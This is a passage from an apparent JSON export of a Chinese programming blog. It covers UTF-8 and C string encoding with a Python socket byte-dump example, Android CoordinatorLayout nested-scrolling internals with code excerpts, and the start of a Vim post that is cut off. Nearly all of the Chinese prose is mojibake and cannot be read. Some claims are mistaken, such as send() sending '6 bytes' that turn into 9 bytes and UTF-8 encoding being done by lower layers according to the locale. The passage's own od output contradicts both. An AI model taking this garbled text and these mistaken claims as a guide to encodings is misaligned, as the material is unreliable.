å¦‚æœreadçš„æ—¶å€™ä¸€ç›´ç»Ÿè®¡å½“å‰æ€»çš„readåˆ°çš„bytesæ•°ï¼Œåº”è¯¥æ˜¯è¦æ¯”content-lengthé•¿ä¸å°‘çš„ã€‚é‚£ä¹ˆä¸€ä¸ªå­—ç¬¦åˆ°åº•å¤šå°‘ä¸ªbyteå‘¢é¦–å…ˆè¦æ˜ç™½ï¼Œreadå‡ºæ¥çš„ä¸œè¥¿æ˜¯byte(æ˜¯è¢«utf-8ç¼–ç è¿‡çš„)ã€‚å‡ ä¹æ‰€æœ‰çš„è¯­è¨€åœ¨æ¥æ”¶åˆ°ä¹‹åéƒ½è¦é‡æ–°è§£ç ä¸€ä¸‹ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œdecodeä¸€ä¸‹ï¼Œç”¨cè¯­è¨€decodeæ€ä¹ˆå¼„ï¼Ÿ It depends what is the character and what encoding it is in: An ASCII character in 8-bit ASCII encoding is 8 bits (1 byte), though it can fit in 7 bits. An ISO-8895-1 character in ISO-8859-1 encoding is 8 bits (1 byte). A Unicode character in UTF-8 encoding is between 8 bits (1 byte) and 32 bits (4 bytes). A Unicode character in UTF-16 encoding is between 16 (2 bytes) and 32 bits (4 bytes), though most of the common characters take 16 bits. This is the encoding used by Windows internally. A Unicode character in UTF-32 encoding is always 32 bits (4 bytes). An ASCII character in UTF-8 is 8 bits (1 byte), and in UTF-16 - 16 bits. The additional (non-ASCII) characters in ISO-8895-1 (0xA0-0xFF) would take 16 bits in UTF-8 and UTF-16. what-is-the-default-encoding-for-c-strings ç»“è®ºå°±æ˜¯cè¯­è¨€çš„æ ‡å‡†å¹¶æ²¡æœ‰è§„å®šç”¨ä»€ä¹ˆencoding A c string is pretty much just a sequence of bytes. That means, that it does not have a well-defined encoding, it could be ASCII, UTF8 or anything else, for that matter. Because most operating systems understand ASCII by default, and source code is mostly written with ASCII encoding, so the data you will find in a simple (char) will very often be ASCII as well. Nonetheless, there is no guarantee that what you get out of a (char) will be UTF8 or even KOI8. javaç”¨utf-8,cç”¨äº†ascii ç”¨ä¸Šé¢çš„cè¯­è¨€çš„serverå‘å‡ºè¿™æ ·ä¸€ä¸ªå­—ç¬¦ä¸² â€œä½ å¥½å•Š\\r\\nâ€ pythonçš„clientæ¯æ¬¡è¯»å–ä¸€ä¸ªå­—èŠ‚,ç„¶åæ‰“å°å‡º0101è¿™æ ·çš„å½¢å¼ while True: # æ¯æ¬¡æœ€å¤šæ¥æ”¶1ä¸ªå­—èŠ‚: d = s.recv(1) t = &#39;&#39; for x in d: t+= format(ord(x),&#39;b&#39;) print(t) if d: buffer.append(d) else: break data = b&#39;&#39;.join(buffer) print(data); //åœ¨pythonçš„socket clientè¿™è¾¹æ¥æ”¶åˆ°äº†111001001011110110100000111001011010010110111101111001011001010110001010 bâ€™\\xe4â€™ bâ€™\\xbdâ€™ bâ€™\\xa0â€™ bâ€™\\xe5â€™ bâ€™\\xa5â€™ bâ€™\\xbdâ€™ bâ€™\\xe5â€™ bâ€™\\x95â€™ bâ€™\\x8aâ€™ â€˜\\râ€™ â€˜\\nâ€™ å› ä¸ºtcpæ˜¯æœ‰åºçš„ï¼Œæ‰€ä»¥å‘é€ç«¯çš„å­—èŠ‚ä»¥ä»€ä¹ˆé¡ºåºæ’åˆ—çš„ï¼Œæ¥å—ç«¯å°±æ˜¯å—åˆ°å®Œå…¨ä¸€æ ·é¡ºåºæ’åˆ—çš„å­—èŠ‚ã€‚è¿™é‡Œå› ä¸ºç½‘ç»œä¼ è¾“æ˜¯ä»¥å­—èŠ‚ä¸ºå•ä½çš„ã€‚è€Œsizeof(char) = 1 ï¼Œä½†æ˜¯sizeof(int) = 4, ä»¥ä¸Šéƒ½è¿˜åªæ˜¯text-based contentï¼Œå­—èŠ‚åºè¿™å›äº‹åªè·Ÿå¤šå­—èŠ‚ç±»å‹çš„æ•°æ®æœ‰å…³çš„æ¯”å¦‚int,short,longè¿™ç±»æ•°å­—ç±»å‹æœ‰å…³ï¼Œæ‰€ä»¥åŸºäºæ–‡æœ¬ä¼ è¾“çš„åè®®å½“ç„¶ä¸å­˜åœ¨å­—èŠ‚åºé—®é¢˜(å½“ç„¶content-lengthè¿™ç§æ•°å­—è¿˜æ˜¯è¦æ³¨æ„ä¸€ä¸‹çš„)ã€‚ //åœ¨consoleé‡Œé¢è¿˜èƒ½å¤Ÿæ­£å¸¸çš„æ‰“å°å‡ºâ€œä½ å¥½å•Šâ€è¿™ä¸‰ä¸ªå­—ï¼ˆåŒ…æ‹¬æ¢è¡Œä¹Ÿåšäº†ï¼‰ ut-8æ˜¯å˜é•¿çš„Unicodeç¬¦å·èŒƒå›´ | UTF-8ç¼–ç æ–¹å¼(åå…­è¿›åˆ¶) | ï¼ˆäºŒè¿›åˆ¶ï¼‰â€”â€”â€”â€”â€”â€”â€”-+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” 0 0x7f | 0xxxxxxx 0x80 0x7FF | 110xxxxx 10xxxxxx 0x800 0xFFFF | 1110xxxx 10xxxxxx 10xxxxxx0x10000 0x10FFFF | 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx //æ¥çœ‹è¿™ä¸‰ä¸ªå­—çš„unicodeç ä½  -&gt; u4f60 â€”â€“&gt; è½¬æ¢æˆäºŒè¿›åˆ¶å°±æ˜¯ 0100 1111 0110 0000(ä½äºä¸Šè¡¨çš„ç¬¬ä¸‰è¡Œï¼Œä¹Ÿå°±æ˜¯ä¸‰ä¸ªå­—èŠ‚) æŠŠ0100 1111 0110 0000å¡è¿›1110xxxx 10xxxxxx 10xxxxxxçš„xxxé‡Œé¢å¾—åˆ°11100100 10111101 10100000ï¼ˆE4 BD A0ï¼‰å¥½ -&gt; u597d â€”â€“&gt; åŒä¸Šï¼Œä¸å†èµ˜è¿°å•Š -&gt; u554a â€”â€“&gt; åŒä¸Šï¼Œä¸å†èµ˜è¿° åœ¨æµè§ˆå™¨consoleé‡Œé¢è¾“å…¥encodeURI(â€˜ä½ å¥½å•Šâ€™)â€œ%E4%BD%A0%E5%A5%BD%E5%95%8Aâ€ //æ˜¯ä¸æ˜¯å’Œpythoné‚£è¾¹æ”¶åˆ°çš„ä¸œè¥¿å¾ˆåƒ æ‰€ä»¥ï¼Œcè¯­è¨€è¿™è¾¹å…³é”®å‡½æ•°send(sock_client,â€ä½ å¥½å•Šâ€,len,0);çœ‹ä¸Šå»æ˜¯å‘é€äº†6ä¸ªå­—èŠ‚(æ¯ä¸ªæ±‰å­—unicodeä¸¤ä¸ªå­—èŠ‚)ï¼Œå®é™…ä¸Šsendè°ƒç”¨ä¸‹å±‚åœ¨å‘é€å‡ºå»çš„æ—¶å€™å›æŠŠè¿™ä¸ª6ä¸ªå­—èŠ‚çš„æ•°æ®åˆ†æ•£åœ¨9ä¸ªå­—èŠ‚é•¿åº¦çš„utf-8 byte arrayä¸Šã€‚å¯ä»¥è®¤ä¸ºå‘é€6ä¸ªå­—èŠ‚ï¼Œè€—è´¹9ä¸ªå­—èŠ‚çš„æµé‡(å¦‚æœå‘é€çš„å…¨éƒ¨æ˜¯asciiå­—ç¬¦å°±ä¸ä¼šè¿™ä¹ˆæµªè´¹äº†ï¼Œä½†å…¶å®utf-8å·²ç»å¾ˆèŠ‚çœäº†) ç»“è®ºå°±æ˜¯utf-8 encodeçš„å·¥ä½œæ˜¯åº•å±‚æ ¹æ®localeåšçš„ï¼Œè·Ÿapplicationæ— å…³ã€‚ libcåªæ˜¯å½“ä½œä»¥0ç»“å°¾çš„å­—ç¬¦ä¸²åŸå°ä¸åŠ¨åœ°writeç»™å†…æ ¸ï¼Œè¯†åˆ«æ±‰å­—çš„å·¥ä½œæ˜¯ç”±ç»ˆç«¯çš„é©±åŠ¨ç¨‹åºåšçš„ã€‚ä¹Ÿå°±æ˜¯åŸºäºå½“å‰çš„locale #include &lt;stdio.h&gt; int main(void) { printf(&quot;ä½ å¥½\\n&quot;); return 0; } ä¸Šè¿°ç¨‹åºæºæ–‡ä»¶æ˜¯ä»¥UTF-8ç¼–ç å­˜å‚¨çš„ï¼š $ od -tc nihao.c 0000000 # i n c l u d e &lt; s t d i o . 0000020 h &gt; \\n \\n i n t m a i n ( v o i 0000040 d ) \\n { \\n \\t p r i n t f ( &quot; 344 275 0000060 240 345 245 275 \\ n &quot; ) ; \\n \\t r e t u r 0000100 n 0 ; \\n } \\n 0000107 å…¶ä¸­å…«è¿›åˆ¶çš„344 375 240ï¼ˆåå…­è¿›åˆ¶e4 bd a0ï¼‰å°±æ˜¯â€œä½ â€çš„UTF-8ç¼–ç ï¼Œå…«è¿›åˆ¶çš„345 245 275ï¼ˆåå…­è¿›åˆ¶e5 a5 bdï¼‰å°±æ˜¯â€œå¥½â€ã€‚æŠŠå®ƒç¼–è¯‘æˆç›®æ ‡æ–‡ä»¶ï¼Œâ€ä½ å¥½\\nâ€è¿™ä¸ªå­—ç¬¦ä¸²å°±æˆäº†è¿™æ ·ä¸€ä¸²å­—èŠ‚ï¼še4 bd a0 e5 a5 bd 0a 00ï¼Œæ±‰å­—åœ¨å…¶ä¸­ä»ç„¶æ˜¯UTF-8ç¼–ç çš„ï¼Œä¸€ä¸ªæ±‰å­—å 3ä¸ªå­—èŠ‚ï¼Œè¿™ç§å­—ç¬¦åœ¨Cè¯­è¨€ä¸­ç§°ä¸ºå¤šå­—èŠ‚å­—ç¬¦ï¼ˆMultibyte Characterï¼‰ã€‚è¿è¡Œè¿™ä¸ªç¨‹åºç›¸å½“äºæŠŠè¿™ä¸€ä¸²å­—èŠ‚writeåˆ°å½“å‰ç»ˆç«¯çš„è®¾å¤‡æ–‡ä»¶ã€‚å¦‚æœå½“å‰ç»ˆç«¯çš„é©±åŠ¨ç¨‹åºèƒ½å¤Ÿè¯†åˆ«UTF-8ç¼–ç å°±èƒ½æ‰“å°å‡ºæ±‰å­—ï¼Œå¦‚æœå½“å‰ç»ˆç«¯çš„é©±åŠ¨ç¨‹åºä¸èƒ½è¯†åˆ«UTF-8ç¼–ç ï¼ˆæ¯”å¦‚ä¸€èˆ¬çš„å­—ç¬¦ç»ˆç«¯ï¼‰å°±æ‰“å°ä¸å‡ºæ±‰å­—ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåƒè¿™ç§ç¨‹åºï¼Œè¯†åˆ«æ±‰å­—çš„å·¥ä½œæ—¢ä¸æ˜¯ç”±Cç¼–è¯‘å™¨åšçš„ä¹Ÿä¸æ˜¯ç”±libcåšçš„ï¼ŒCç¼–è¯‘å™¨åŸå°ä¸åŠ¨åœ°æŠŠæºæ–‡ä»¶ä¸­çš„UTF-8ç¼–ç å¤åˆ¶åˆ°ç›®æ ‡æ–‡ä»¶ä¸­ï¼Œlibcåªæ˜¯å½“ä½œä»¥0ç»“å°¾çš„å­—ç¬¦ä¸²åŸå°ä¸åŠ¨åœ°writeç»™å†…æ ¸ï¼Œè¯†åˆ«æ±‰å­—çš„å·¥ä½œæ˜¯ç”±ç»ˆç«¯çš„é©±åŠ¨ç¨‹åºåšçš„ã€‚ Unicode in C and C++: What You Can Do About It Today è¿™ç¯‡æ–‡ç« æåˆ°ï¼Œç”±äºhttp keep-aliveçš„å­˜åœ¨ï¼Œè¯»å–serverçš„responseå·²ç»è¯»ä¸åˆ°EOFäº†ï¼Œæ‰€ä»¥ä¹Ÿå°±ä¸èƒ½ä»¥EOFä½œä¸ºè¯»å–å®Œæ¯•çš„æ ‡å¿—ã€‚åˆ†ä¸¤ç§æƒ…å†µï¼šæœ‰Content-lengthçš„ï¼ŒTransfer-Encodingï¼šchunkedï¼ˆå¤æ‚ä¸€ç‚¹ç‚¹ï¼‰è¿™ä¸¤ç§ã€‚chunkedç®€å•è¯´å°±æ˜¯æŠŠä¸€ä¸ªå¤§æ–‡ä»¶åˆ‡åˆ†æˆNä¸ªå°åŒ…ï¼Œæ¯ä¸ªåŒ…(chunk)é‡Œé¢åŒ…æ‹¬headerå’Œbodyã€‚è¿™ä¸ªheaderé‡Œé¢ä¹Ÿæ˜¯æœ‰bodyçš„é•¿åº¦çš„ã€‚ todosock5åè®®çš„è§£é‡Špython selectorå®ç°é«˜é˜¶çš„httpserverread from socket , and write it to local file ,how about that?(simple file downloader in c)","tags":[{"name":"linux","slug":"linux","permalink":"https://haldir65.github.io/tags/linux/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"CoordiantorLayoutåŠæ»‘åŠ¨åŸç†è§£æ","date":"2018-09-24T19:35:11.000Z","path":"2018/09/24/2018-09-24-mastering-scrolling-techniques/","text":"åœ¨Androidå¹³å°ä¸Šï¼ŒæŒæ¡æ»‘åŠ¨äº‹ä»¶æ˜¯ä¸€ä»¶è®©äººå¤´ç–¼çš„äº‹æƒ…ã€‚ 1.å…³äºCoordinateLayouté‡Œé¢çš„ä¸œè¥¿ï¼ˆé’ˆå¯¹supportLibrary27.1.0ä»£ç ï¼‰&lt;android.support.design.widget.CoordinatorLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; &gt; &lt;android.support.design.widget.AppBarLayout &gt; &lt;android.support.v7.widget.Toolbar app:layout_scrollFlags=&quot;scroll|enterAlways|snap&quot; /&gt; &lt;android.support.design.widget.TabLayout /&gt; &lt;/android.support.design.widget.AppBarLayout&gt; &lt;android.support.v4.view.ViewPager app:layout_behavior=&quot;@string/appbar_scrolling_view_behavior&quot; /&gt; &lt;android.support.design.widget.FloatingActionButton /&gt; &lt;/android.support.design.widget.CoordinatorLayout&gt; å‰”é™¤ä¸€äº›æ— å…³çš„å±æ€§åï¼Œå¯ä»¥è§‚å¯Ÿåˆ°:app:layout_scrollFlagsæ˜¯å†™ç»™AppBarLayoutçœ‹çš„app:layout_behavioræ˜¯å†™ç»™CoordinatorLayoutçœ‹çš„ app:layout_scrollFlags = scrollçš„æ—¶å€™ï¼Œæ‰‹æŒ‡ä¸Šæ»‘ä¸‹æ»‘ï¼ŒåŠ äº†flagçš„Viewåªä¼šåœ¨å¤–å±‚çš„ScrollingView(è¿™é‡Œå°±æ˜¯ViewPageräº†)æ»‘åŠ¨åˆ°å¤´äº†æ‰å¼€å§‹æ»‘åŠ¨ app:layout_scrollFlags = scroll|enterAlwaysçš„æ—¶å€™ï¼Œæ‰‹æŒ‡ä¸Šä¸‹æ»‘åŠ¨æ—¶ï¼ŒåŠ äº†flagçš„viewä¼šç«‹åˆ»å“åº”ï¼ˆè¿˜ä¸ç­‰å¤–éƒ¨çš„ScrollingViewæ»‘åˆ°å¤´å°±å¼€å§‹æ»‘åŠ¨ï¼Œå½“ç„¶è¿™é‡Œæ²¡æœ‰åŠ¨ç”»ï¼Œæ‰‹æŒ‡æ…¢æ…¢çš„æŒªçš„è¯ï¼Œå¯ä»¥è®©å®ƒåœåœ¨ä¸€åŠçš„ä½ç½®ï¼‰ã€‚å¯ä»¥ç†è§£ä¸ºæ‰‹æŒ‡ä¸Šä¸‹æ»‘åŠ¨æ—¶ï¼Œåªè¦åŠ äº†flagçš„viewä¼šä¼˜å…ˆæ¶ˆè´¹å®Œæ»‘åŠ¨è·ç¦» app:layout_scrollFlags = scroll|enterAlways|snapçš„æ—¶å€™ï¼Œå°±åŠ ä¸ŠåŠ¨ç”»äº†ï¼ˆæ‰‹æŒ‡å¾€ä¸‹æ‹–ï¼ŒæŠŠtoolbaræ‹–å‡ºæ¥ä¸åˆ°ä¸€åŠçš„æ—¶å€™å®ƒä¼šç¼©å›å»ï¼Œè¶…å‡ºä¸€åŠçš„æ—¶å€™ä¼šåŠ¨ç”»å¼¹å‡ºæ¥ï¼‰è¿™æ®µåŠ¨ç”»çš„ä»£ç åœ¨AppBarLayout.Behaviorçš„onStopNestedScrollæ–¹æ³•é‡Œé¢åˆ¤æ–­äº† if ((flags &amp; LayoutParams.FLAG_SNAP) == LayoutParams.FLAG_SNAP) {//æ‰€ä»¥flagè¿™ä¸ªä¸œè¥¿å…¶å®æ˜¯AppbarLayout.LayoutParamsçš„ä¸€ä¸ªå±æ€§ã€‚å¯ä»¥è¿›è¡Œä½è¿ç®—æ“ä½œ // ... animateOffsetTo(coordinatorLayout, abl, MathUtils.clamp(newOffset, -abl.getTotalScrollRange(), 0), 0); } //é‚£ä¸ªsnapçš„åŠ¨ç”»é•¿è¿™æ · if (mOffsetAnimator == null) { mOffsetAnimator = new ValueAnimator(); mOffsetAnimator.setInterpolator(AnimationUtils.DECELERATE_INTERPOLATOR); mOffsetAnimator.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() { @Override public void onAnimationUpdate(ValueAnimator animation) { setHeaderTopBottomOffset(coordinatorLayout, child, (int) animation.getAnimatedValue()); //åšåŠ¨ç”»çš„è¿‡ç¨‹ä¸­è°ƒç”¨AppbarLayout(å…¶å®å°±æ˜¯ä¸€ä¸ªLinearLayout)çš„offsetTopAndBottomæ–¹æ³• } }); } else { mOffsetAnimator.cancel(); } mOffsetAnimator.setDuration(Math.min(duration, MAX_OFFSET_ANIMATION_DURATION)); mOffsetAnimator.setIntValues(currentOffset, offset); mOffsetAnimator.start(); åœ¨Cheesequareçš„é¦–é¡µï¼ŒRecyclerViewå‡†å¤‡æ»‘åŠ¨(ActionMove)è¿˜æ²¡æ»‘åŠ¨æ—¶è°ƒç”¨äº†RecyclerView.dispatchNestedPreScroll -&gt; CoordinateLayout.onNestedPreScroll -&gt;AppbarLayout.Beahvior.onNestedPreScroll -&gt;AppbarLayout.offsetTopAndBottom åœ¨RecyclerViewçš„scrollByInternalé‡Œé¢è°ƒç”¨äº†RecyclerView.dispatchNestedScroll -&gt;CoordinateLayout.onNestedScroll -&gt;CoordinatorLayout.onChildViewChanged -&gt; AppbarLayoutBehavior.onDependentViewChanged -&gt;AppbarLayout.onNestedScroll -&gt; AppbarLayout.Behavior.onNestedScroll RecyclerView(Action_UP)çš„æ—¶å€™è°ƒç”¨é¡ºåº:RecyclerView.stopNestedScroll(è¿™ä¸ªå…¶å®ä¸æ˜¯è®©RecyclerViewåœä¸‹æ¥ï¼Œè€Œæ˜¯å‘Šè¯‰parentåº”è¯¥åœä¸‹æ¥äº†)CoordinateLayout.onStopNestedScrollAppbarLayout.onStopNestedScrollAppbarLayout.Behavior.onStopNestedScrollAppbarLayout.Behavior.snapToChildIfNeeded(å°±æ˜¯ä¸Šé¢è¯´çš„å¦‚æœ scroll|enterAlways|snapéƒ½åœ¨æ—¶å€™çš„åŠ¨ç”»äº†) //æ³¨æ„AppbarLayoutæ˜¯æœ‰ä¸€ä¸ªé»˜è®¤çš„behaviorçš„ @CoordinatorLayout.DefaultBehavior(AppBarLayout.Behavior.class) public class AppBarLayout extends LinearLayout { } //åœ¨AppbarLayoutçš„è¯­ä¹‰é‡Œï¼Œä¸Šä¸‹æ»‘åŠ¨çš„è·ç¦»ç”¨çš„æ˜¯offsetè¿™ä¸ªå…³é”®å­— //è¿™åˆæ˜¯ä¸€ä¸ªpublic static class //åœ¨AppBarLayout.Behavioré‡Œé¢æœ‰è¿™ä¹ˆä¸€æ®µ @Override public boolean layoutDependsOn(CoordinatorLayout parent, View child, View dependency) { // We depend on any AppBarLayouts return dependency instanceof AppBarLayout; } @Override public boolean onDependentViewChanged(CoordinatorLayout parent, View child, View dependency) { offsetChildAsNeeded(parent, child, dependency);//childå°±æ˜¯åº•éƒ¨åœ¨åŠ äº†behaviorçš„ViewPager,dependencyæ˜¯AppbarLayout.è¿™é‡Œé¢å°±æ˜¯è°ƒç”¨äº†child.offsetTopAndBottom return false; } //ä»è°ƒç”¨é¡ºåºæ¥çœ‹ï¼Œæ˜¯åŠ äº†behaviorçš„View(åº•éƒ¨çš„ViewPager)æ»‘åŠ¨æ—¶dispatchNestedPreScroll -&gt; CoordinatorLayout.onNestedPreScroll -&gt; CoordinatorLayoutä¼šä¸€ä¸ªä¸ªchildå»æŸ¥ï¼Œå‘ç°ä¸€ä¸ªbehaviorä¸ä¸ºNullçš„å°±ä¼šè°ƒç”¨onChildViewsChanged-&gt; è¿™é‡Œé¢è¿˜æ˜¯ä¸€ä¸ªä¸ªéå†child(ä¸€ä¸ªä¸ªé—®layoutDependsOnï¼Œå†…éƒ¨å®ç°æ˜¯éå†æ¯ä¸ªchildï¼Œç„¶åé’ˆå¯¹æ¯ä¸ªchildï¼Œæ‹¿ç€å½“å‰åŠ ä¸Šäº†behaviorçš„viewsä¸€ä¸ªä¸ª(mDependencySortedChildren)æ¥é—®ï¼Œè¯¢é—®åŠ äº†behaviorçš„childçš„behaviorï¼Œè¿™ä¸ªchildæ˜¯å¦æ„Ÿå…´è¶£ã€‚ã€‚ã€‚ä¸€æ—¦æ„Ÿå…´è¶£å°±èµ°onDependentViewChanged) // åœ¨cheesequareçš„ä¸»é¡µé¢ï¼ŒmDependencySortedChildrenè¿™ä¸ªList&lt;View&gt;é»˜è®¤æœ‰ä¸‰ä¸ªå…ƒç´ AppBarLayout,ViewPager,FloatingActionButton(ViewPageræ˜¯æˆ‘ä»¬æ‰‹åŠ¨åŠ ä¸Šå»çš„ï¼Œå…¶ä»–ä¸¤ä¸ªéƒ½æ˜¯defaulté…å¤‡äº†behaviorçš„)ã€‚ç”±æ­¤çœ‹æ¥ï¼Œè‡ªå·±å¯ä»¥å†™ä¸€ä¸ªbehaviorï¼ŒåŠ åœ¨CoordinatorLayoutçš„childä¸­ï¼Œè¿™æ ·å°±èƒ½å‚ä¸åˆ°mDependencySortedChildrenè¿™ä¸ªè¿‡ç¨‹ä¸­äº† //åœ¨mDependencySortedChildrenä¸­ï¼ŒViewPageræ˜¯dependend on AppBarLayoutçš„ã€‚ä¹Ÿå°±æ˜¯è¯´åŠ åœ¨ViewPagerä¸Šçš„behavior // :app:layout_behavior=&quot;@string/appbar_scrolling_view_behavior&quot; è¿™ç©æ„å…¶å®å†™åœ¨AppbarLayoutä¸­ public static class ScrollingViewBehavior extends HeaderScrollingViewBehavior { } //è°ƒç”¨é¡ºåº RecyclerView.onTouchEvent(ACTION_MOVE) RecyclerView.dispatchNestedPreScroll() NestedScrollChildHelper.dispatchNestedPreScroll() CoordinatorLayout.onNestedPreScroll(View é‚£ä¸ªRecyclerView, int dx, int dy, int[] consumed, int type)//è¿™é‡Œé¢ä¸€ä¸ªä¸ªéå†childæ‰¾åŠ ä¸Šäº†behaviorçš„ï¼Œè°ƒç”¨behaviorçš„onNestedPreScroll CoordinatorLayout.onChildViewsChanged(EVENT_NESTED_SCROLL)//è¿™é‡Œé¢å°±æ˜¯ä¸€ä¸ªä¸ªéå†childï¼Œæ‹¿ç€childå»é—®åŠ äº†bahaviorçš„viewâ€œè¿™æ˜¯ä½ æƒ³è¦çš„å—â€ï¼Œå¦‚æœæ˜¯è‚¯å®šç­”å¤ï¼Œä¼šèµ°åˆ°onDependentViewChangedï¼ˆCoordinatorLayout,View åŠ äº†behaviorçš„view,View behavioræ„Ÿå…´è¶£çš„Viewï¼‰.æ‰€ä»¥å¤šæ•°çš„å®ç°éƒ½å¯ä»¥åœ¨è¿™é‡ŒåŠ¨æ‰‹ã€‚åˆå› ä¸ºåŠ äº†bahaviorçš„viewäº‹å®ä¸Šæ˜¯ä¸€ä¸ªlistï¼Œäº‹å®ä¸Šå¯ä»¥éšä¾¿åŠ ä»»æ„å¤šä¸ªå¸¦behaviorçš„viewã€‚ // https://github.com/saulmm/CoordinatorBehaviorExampleä¸­çš„å®ç°å¦‚ä¸‹ã€‚ @Override public boolean layoutDependsOn(CoordinatorLayout parent, CircleImageView child, View dependency) { return dependency instanceof Toolbar; } @Override public boolean onDependentViewChanged(CoordinatorLayout parent, CircleImageView child, View dependency) { maybeInitProperties(child, dependency); final int maxScrollDistance = (int) (mStartToolbarPosition); float expandedPercentageFactor = dependency.getY() / maxScrollDistance; if (expandedPercentageFactor &lt; mChangeBehaviorPoint) { float heightFactor = (mChangeBehaviorPoint - expandedPercentageFactor) / mChangeBehaviorPoint; float distanceXToSubtract = ((mStartXPosition - mFinalXPosition) * heightFactor) + (child.getHeight()/2); float distanceYToSubtract = ((mStartYPosition - mFinalYPosition) * (1f - expandedPercentageFactor)) + (child.getHeight()/2); child.setX(mStartXPosition - distanceXToSubtract); child.setY(mStartYPosition - distanceYToSubtract); float heightToSubtract = ((mStartHeight - mCustomFinalHeight) * heightFactor); CoordinatorLayout.LayoutParams lp = (CoordinatorLayout.LayoutParams) child.getLayoutParams(); lp.width = (int) (mStartHeight - heightToSubtract); lp.height = (int) (mStartHeight - heightToSubtract); child.setLayoutParams(lp); } else { float distanceYToSubtract = ((mStartYPosition - mFinalYPosition) * (1f - expandedPercentageFactor)) + (mStartHeight/2); child.setX(mStartXPosition - child.getWidth()/2); child.setY(mStartYPosition - distanceYToSubtract); CoordinatorLayout.LayoutParams lp = (CoordinatorLayout.LayoutParams) child.getLayoutParams(); lp.width = (int) (mStartHeight); lp.height = (int) (mStartHeight); child.setLayoutParams(lp); } return true; } ä¸Šè¿°ä¸€ä¸ªä¸ªè¯¢é—®åŠ äº†behaviorçš„childçš„è¿‡ç¨‹å…¶å®å«åšonChildViewChanged(EVENT_NESTED_SCROLL),è¯¥æ–¹æ³•ä¼šåœ¨CoordinatorLayoutçš„onNestedFling,onNestedPreScroll,onNestedScroll,onChildViewRemoved,onPreDrawä¸­éƒ½ä¼šè°ƒç”¨åˆ°ã€‚æ‰€ä»¥åœ¨è¿™é‡Œç›¸åº”æ»‘åŠ¨æ˜¯è¶³å¤Ÿçš„ã€‚ä¸Šè¿°ä¾‹å­é‡Œé¢å°±æ˜¯åœ¨onDependentViewChangedä¸­è·å–å½“å‰targetçš„getYï¼Œå¯¹æ­¤ä½œå‡ºtextViewçš„ç¼©æ”¾ã€‚ æ¥ä¸‹æ¥çœ‹ä¸€å¤§å †æ¥å£: public interface NestedScrollingParent { boolean onStartNestedScroll(@NonNull View child, @NonNull View target, @ScrollAxis int axes); void onNestedScrollAccepted(@NonNull View child, @NonNull View target, @ScrollAxis int axes); void onStopNestedScroll(@NonNull View target); void onNestedScroll(@NonNull View target, int dxConsumed, int dyConsumed, int dxUnconsumed, int dyUnconsumed); void onNestedPreScroll(@NonNull View target, int dx, int dy, @NonNull int[] consumed); boolean onNestedFling(@NonNull View target, float velocityX, float velocityY, boolean consumed); boolean onNestedPreFling(@NonNull View target, float velocityX, float velocityY); int getNestedScrollAxes(); } public interface NestedScrollingParent2 extends NestedScrollingParent { boolean onStartNestedScroll(@NonNull View child, @NonNull View target, @ScrollAxis int axes, @NestedScrollType int type); void onNestedScrollAccepted(@NonNull View child, @NonNull View target, @ScrollAxis int axes, @NestedScrollType int type); void onStopNestedScroll(@NonNull View target, @NestedScrollType int type); void onNestedScroll(@NonNull View target, int dxConsumed, int dyConsumed, int dxUnconsumed, int dyUnconsumed, @NestedScrollType int type); void onNestedPreScroll(@NonNull View target, int dx, int dy, @NonNull int[] consumed, @NestedScrollType int type); } // ä¼¼ä¹å°±æ˜¯æ·»åŠ äº†ä¸€ä¸ªNestedScrollType @IntDef({TYPE_TOUCH, TYPE_NON_TOUCH}) @Retention(RetentionPolicy.SOURCE) @RestrictTo(LIBRARY_GROUP) public @interface NestedScrollType {} public interface NestedScrollingChild { void setNestedScrollingEnabled(boolean enabled); boolean isNestedScrollingEnabled(); boolean startNestedScroll(@ScrollAxis int axes); void stopNestedScroll(); boolean hasNestedScrollingParent(); boolean dispatchNestedScroll(int dxConsumed, int dyConsumed, int dxUnconsumed, int dyUnconsumed, @Nullable int[] offsetInWindow); boolean dispatchNestedPreScroll(int dx, int dy, @Nullable int[] consumed, @Nullable int[] offsetInWindow); boolean dispatchNestedFling(float velocityX, float velocityY, boolean consumed); boolean dispatchNestedPreFling(float velocityX, float velocityY); } public interface NestedScrollingChild2 extends NestedScrollingChild { boolean startNestedScroll(@ScrollAxis int axes, @NestedScrollType int type); void stopNestedScroll(@NestedScrollType int type); boolean hasNestedScrollingParent(@NestedScrollType int type); boolean dispatchNestedScroll(int dxConsumed, int dyConsumed, int dxUnconsumed, int dyUnconsumed, @Nullable int[] offsetInWindow, @NestedScrollType int type); boolean dispatchNestedPreScroll(int dx, int dy, @Nullable int[] consumed, @Nullable int[] offsetInWindow, @NestedScrollType int type); } //ä¼¼ä¹ä¹Ÿåªæ˜¯åŠ äº†ä¸€ä¸ªNestedScrollTypeï¼Œ2æ˜¯1çš„å­ç±» //çœ‹ä¸€ä¸‹ç»§æ‰¿å…³ç³» public class SwipeRefreshLayout extends ViewGroup implements NestedScrollingParent, NestedScrollingChild { } public class NestedScrollView extends FrameLayout implements NestedScrollingParent, NestedScrollingChild2, ScrollingView { } public class RecyclerView extends ViewGroup implements ScrollingView, NestedScrollingChild2 { } public class CoordinatorLayout extends ViewGroup implements NestedScrollingParent2 { } å…³äºCoordinatorLayoutçš„æ¯”è¾ƒå¥½çš„æ•™ç¨‹ SwipeRefreshLayouté‡Œé¢æœ‰ä¸€ä¸ªOnChildScrollUpCallbackç”¨äºå†³å®šæ˜¯å¦å¯ä»¥æ‹¦æˆªå®è·µï¼Œæ¯”setEnabledè¦å¥½å¾ˆå¤šCoordinateLayout inside SwipeRefreshLayoutçš„é—®é¢˜ä¼¼ä¹å¯ä»¥ä»è¿™é‡Œå»è§£å†³","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"}]},{"title":"Vimå¸¸ç”¨å‘½ä»¤æŒ‡å—","date":"2018-08-26T22:49:00.000Z","path":"2018/08/26/2018-08-26-vim-the-editor/","text":"é¦–å…ˆæ˜¯ä¸€äº›åŠ å¿«terminal ä¸­æ“ä½œçš„å‘½ä»¤ï¼Œè·Ÿvimæ²¡ä»€ä¹ˆå…³ç³» åœ¨bashä¸­ï¼Œå‡ 